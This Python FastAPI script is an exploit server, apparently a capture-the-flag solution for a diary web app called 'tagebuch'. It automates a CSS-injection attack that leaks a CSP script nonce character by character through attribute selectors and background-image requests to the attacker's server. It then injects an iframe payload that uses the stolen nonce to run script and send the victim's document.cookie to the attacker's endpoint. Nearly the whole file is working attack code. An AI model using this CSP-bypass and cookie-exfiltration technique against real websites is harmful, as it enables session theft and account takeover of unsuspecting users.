import asyncio
from contextlib import asynccontextmanager
from http.cookiejar import CookieJar
import logging
import re
from typing import Any, Literal, TypedDict
from pathlib import Path

from bs4 import BeautifulSoup
from fastapi import Depends, FastAPI, HTTPException, Request, WebSocket
from fastapi.responses import HTMLResponse
from httpx import AsyncClient
from rich.logging import RichHandler
import random
import string


logger = logging.getLogger(__name__)
logger.handlers.clear()
logger.addHandler(RichHandler())
logging.basicConfig(level=logging.INFO)


class BackendEventDict(TypedDict):
    kind: Literal["id", "nonce", "heartbeat"]
    data: Any


backend_event = asyncio.Queue[BackendEventDict](maxsize=1)
connected_signal = asyncio.Event()

exploit_target = "https://tagebuch-challenge.any-mix.eu.org/"  # Exploit target

session = AsyncClient(
    http2=True,
    base_url=exploit_target,
    follow_redirects=True,
    cookies=CookieJar(),
)

UPLOAD_ID_REGEX = re.compile(r"/read#id=(?P<id>\d+)")
USERNAME = "mix_%s" % "".join(random.choices(string.ascii_lowercase, k=6))

CSS_LEAK_CHARSET = string.ascii_letters + string.digits
CSS_LEAK_TEMPLATE = """
script[nonce^="{known_nonce}{guess}"] {{
    display: block;
    background: url("{server_url}?nonce={known_nonce}{guess}");
}}"""

EXPLOIT_TEMPLATE = """
<iframe srcdoc="<script nonce='{nonce}'>location.href='{update_page_url}?known_nonce='+document.cookie</script>"></iframe>
"""


@asynccontextmanager
async def login_user(app: FastAPI):
    response = await session.post(
        "/login", data={"username": USERNAME, "password": USERNAME}
    )
    response.raise_for_status()
    logger.info(f"Login as {USERNAME} with cookie {session.cookies}")
    yield


app = FastAPI(lifespan=login_user)


@app.websocket("/event")
async def id_change(websocket: WebSocket):
    try:
        await websocket.accept()
        logger.info("Websocket connected")
        connected_signal.set()
        while True:
            try:
                event = await asyncio.wait_for(backend_event.get(), timeout=1)
                logger.info(f"Sending event {event}")
            except asyncio.TimeoutError:
                event = {"kind": "heartbeat", "data": None}
            await websocket.send_json(event)
    except Exception as e:
        logger.exception(e)
    connected_signal.clear()
    await websocket.close()


async def is_connected():
    if not connected_signal.is_set():
        logger.warning("Attempted to send event before websocket connection")
        raise HTTPException(503, "no websocket connection")
    return True


@app.get("/css-leak", dependencies=[Depends(is_connected)])
async def css_leak(nonce: str):
    logger.info(f"Received nonce {nonce}")
    await backend_event.put({"kind": "nonce", "data": nonce})
    return "ok"


@app.get("/update-page", dependencies=[Depends(is_connected)])
async def update_page(request: Request, known_nonce: str = ""):
    logger.info(f"Received target nonce {known_nonce}")
    server_url = request.url_for(css_leak.__name__)
    content = (
        "<style>"
        + "\n".join(
            CSS_LEAK_TEMPLATE.format(
                known_nonce=known_nonce, guess=guess, server_url=server_url
            )
            for guess in CSS_LEAK_CHARSET
        )
        + "</style>"
        + EXPLOIT_TEMPLATE.format(
            nonce=known_nonce,
            update_page_url=request.url_for(update_page.__name__),
        )
    )
    response = await session.post(
        "/write",
        data={
            "title": (title := f"lk:{known_nonce}"),
            "content": content,
        },
    )
    response.raise_for_status()
    soup = BeautifulSoup(response.text, "html.parser")
    anchor = next(
        (
            matched
            for a in soup.find_all("a")
            if a.text.strip() == title
            and (matched := UPLOAD_ID_REGEX.search(a.attrs["href"]))
        ),
        None,
    )
    assert anchor is not None
    uploaded_id = anchor.group("id")
    logger.info(f"Uploaded diary {uploaded_id}")

    response = await session.get(f"/share_diary/{uploaded_id}")
    response.raise_for_status()
    soup = BeautifulSoup(response.text, "html.parser")
    matched = next(
        (a for a in soup.find_all("a") if a.text.strip() == title),
        None,
    )
    assert matched is not None
    path = matched.attrs["href"]
    logger.info(f"Shared diary {path=}")
    await backend_event.put({"kind": "id", "data": path})
    return "ok"


@app.get("/index")
async def index(request: Request):
    exp_site = (Path(__file__).parent / "exp.html").read_text(encoding="utf-8")
    return HTMLResponse(content=exp_site, status_code=200)


if __name__ == "__main__":
    import uvicorn

    uvicorn.run(
        app,
        host="0.0.0.0",
        port=8000,
        log_config={
            "version": 1,
            "disable_existing_loggers": False,
            "handlers": {
                "console": {
                    "class": "rich.logging.RichHandler",
                    "formatter": "simple",
                },
            },
            "formatters": {
                "simple": {
                    "format": "%(message)s",
                },
            },
            "loggers": {
                "uvicorn.error": {
                    "level": "INFO",
                    "handlers": ["console"],
                    "propagate": False,
                },
                "uvicorn.access": {
                    "level": "INFO",
                    "handlers": ["console"],
                    "propagate": False,
                },
            },
            "root": {
                "level": "INFO",
                "handlers": ["console"],
            },
        },
    )
